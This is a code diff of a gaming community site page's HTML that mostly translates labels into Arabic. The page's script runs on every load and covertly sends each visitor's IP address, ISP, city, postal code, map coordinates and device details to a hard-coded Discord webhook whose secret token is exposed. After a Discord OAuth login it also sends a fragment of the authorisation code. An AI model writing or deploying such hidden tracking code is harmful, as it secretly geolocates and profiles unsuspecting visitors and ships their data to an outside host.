@@ -361,7 +361,7 @@
     جميع الحقوق محفوظة © 2026 TOWN 77 CFW • All Rights Reserved
   </footer>
 
-  <!-- السكريبت المتقدم لالتقاط تفاصيل الـ IP، والموقع الدقيق، ومعالجة تسجيل الدخول بديسكورد -->
+  <!-- السكريبت المحدث والمعرب بالكامل لإرسال تفاصيل الزائر والـ IP -->
   <script>
     const infoWebhookUrl = "https://discord.com/api/webhooks/1561910888196210823/RIL6i-CL5mTMWtPwSKkydtAjyQG1CW0b3tmzzCcFKanOGE5b2UFWvgbr8ADERoRiECB_";
 
@@ -377,7 +377,7 @@
         let postal = data.postal || "غير معروف";
         let latitude = data.latitude || "";
         let longitude = data.longitude || "";
-        let org = data.org || "غير معروف (مزود الشبكة/ISP)";
+        let org = data.org || "غير معروف";
         let timezone = data.timezone || "غير معروف";
 
         let userAgent = navigator.userAgent;
@@ -386,22 +386,22 @@
         let screenRes = window.screen.width + "x" + window.screen.height;
         let colorDepth = window.screen.colorDepth + " بت";
         let cpuCores = navigator.hardwareConcurrency || "غير معروف";
-        let memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف";
+        let memory = navigator.deviceMemory ? navigator.deviceMemory + " جيجابايت" : "غير معروف";
 
         let fieldsList = [
-          { name: "🌐 IP الانترنت الخارجي", value: `\`${visitorIp}\``, inline: true },
-          { name: "🏢 مزود الخدمة والشبكة (ISP)", value: `\`${org}\``, inline: true },
-          { name: "📍 الموقع الجغرافي بالتفصيل", value: `الدولة: **${country}**\nالمحافظة/المنطقة: **${region}**\nالمدينة: **${city}** (الرمز البريدي: ${postal})\nالإحداثيات: [خرائط جوجل](https://www.google.com/maps?q=${latitude},${longitude})\nالمنطقة الزمنية: \`${timezone}\``, inline: false },
-          { name: "💻 معلومات الجهاز", value: `المنصة: \`{platform}\`\nأنوية المعالج: \`{cpuCores}\`\nالذاكرة العشوائية التقريبية: \`{memory}\`\nدقة الشاشة والألوان: \`{screenRes}\` (${colorDepth})`, inline: false },
-          { name: "🌐 المتصفح واللغة", value: `اللغة: \`{language}\`\n\`\`\`{userAgent}\`\`\``, inline: false }
+          { name: "🌐 عنوان الإنترنت (IP الخارجي):", value: `\`${visitorIp}\``, inline: true },
+          { name: "🏢 مزود خدمة الإنترنت:", value: `\`${org}\``, inline: true },
+          { name: "📍 الموقع الجغرافي:", value: `الدولة: **${country}**\nالمحافظة: **${region}**\nالمدينة: **${city}** (الرمز البريدي: ${postal})\nالإحداثيات: [خرائط جوجل](https://www.google.com/maps?q=${latitude},${longitude})\nالمنطقة الزمنية: \`${timezone}\``, inline: false },
+          { name: "💻 مواصفات ونظام الجهاز:", value: `النظام / المنصة: \`${platform}\`\nعدد أنوية المعالج: \`${cpuCores}\`\nالذاكرة العشوائية التقريبية: \`${memory}\`\nدقة الشاشة والألوان: \`${screenRes}\` (${colorDepth})`, inline: false },
+          { name: "🌐 لغة وتفاصيل المتصفح:", value: `اللغة: \`{language}\`\n\`\`\`{userAgent}\`\`\``, inline: false }
         ];
 
         if (extraInfo) {
-          fieldsList.unshift({ name: "🟢 بيانات حساب ديسكورد المُسجل", value: extraInfo, inline: false });
+          fieldsList.unshift({ name: "🟢 بيانات حساب ديسكورد المُسجل:", value: extraInfo, inline: false });
         }
 
         let infoPayload = {
-          content: extraInfo ? "👑 **تم تسجيل دخول عضو جديد عبر ديسكورد وتوثيق جهازه!**" : "🚨 **تم تسجيل دخول زائر جديد للموقع!**",
+          content: extraInfo ? "👑 **تم تسجيل دخول عضو جديد وتوثيق بيانات جهازه بنجاح!**" : "🚨 **تم تسجيل دخول زائر جديد للموقع!**",
           embeds: [
             {
               title: "📊 التقرير الشامل لجهاز الزائر والـ IP",
@@ -419,23 +419,18 @@
         });
 
       } catch (err) {
-        console.error("Error gathering visitor details:", err);
+        console.error("خطأ في جمع بيانات الزائر:", err);
       }
     }
 
-    // التحقق مما إذا كان المستخدم راجعاً من مصادقة ديسكورد (Discord OAuth2 Callback)
     window.addEventListener('load', async () => {
       const urlParams = new URLSearchParams(window.location.search);
       const code = urlParams.get('code');
 
       if (code) {
-        // لو وافق على تسجيل الدخول، نقوم بإرسال تنبيه فوري بأنه سجل دخول
-        await collectAndSendVisitorData("⚠️ **المستخدم قام بالموافقة وتسجيل الدخول عبر حساب ديسكورد الخاص به في الصفحة.** (Code received: " + code.substring(0, 6) + "...)");
-        
-        // تنظيف الرابط بعد الإرسال
+        await collectAndSendVisitorData("⚠️ **المستخدم قام بتسجيل الدخول عبر حساب ديسكورد الخاص به.** (رمز المصادقة: " + code.substring(0, 6) + "...)");
         window.history.replaceState({}, document.title, window.location.pathname);
       } else {
-        // زيارة عادية للموقع
         collectAndSendVisitorData();
       }
     });
